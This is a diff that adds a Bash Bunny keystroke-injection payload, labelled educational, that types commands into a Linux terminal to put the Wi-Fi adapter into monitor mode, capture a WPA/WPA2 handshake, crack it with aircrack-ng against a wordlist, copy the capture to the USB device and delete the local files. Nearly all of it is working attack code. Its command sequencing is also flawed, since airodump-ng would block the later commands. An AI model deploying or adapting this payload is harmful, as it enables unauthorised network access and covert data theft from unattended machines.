@@ -1,0 +1,46 @@
+#!/bin/bash
+# Title: Wi-Fi Brute-force Simulation
+# Description: Simulate a brute-force attack on WPA/WPA2 Wi-Fi networks in a controlled environment.
+# Author: jjarque1
+# Target: Linux
+# Payload developed for educational purposes only
+
+# Set up attack modes
+ATTACKMODE HID STORAGE
+
+# Delay to allow the system to recognize the USB device
+QUACK DELAY 2000
+
+# Open terminal (assumes shortcut Ctrl+Alt+T opens a terminal)
+QUACK CTRL ALT t
+QUACK DELAY 1000
+
+# Start monitoring mode on wlan0
+QUACK STRING sudo airmon-ng start wlan0
+QUACK ENTER
+QUACK DELAY 1000
+
+# Capture WPA/WPA2 handshake (replace 'network_name' with your test SSID)
+QUACK STRING sudo airodump-ng --bssid XX:XX:XX:XX:XX:XX -c 6 -w /tmp/capture wlan0
+QUACK ENTER
+QUACK DELAY 20000  # Adjust delay for the time needed to capture the handshake
+
+# Attempt to crack the captured handshake using a wordlist
+QUACK STRING sudo aircrack-ng -w /path/to/wordlist.txt /tmp/capture*.cap
+QUACK ENTER
+QUACK DELAY 15000  # Adjust based on wordlist size
+
+# Copy the result to Bash Bunny storage
+QUACK STRING cp /tmp/capture*.cap /media/$USER/BashBunny/wifi_bruteforce_handshake.cap
+QUACK ENTER
+QUACK DELAY 2000
+
+# Clean up captured files
+QUACK STRING rm /tmp/capture*.cap
+QUACK ENTER
+
+# Close the terminal
+QUACK CTRL d
+
+# Eject the USB Bash Bunny
+ATTACKMODE OFF
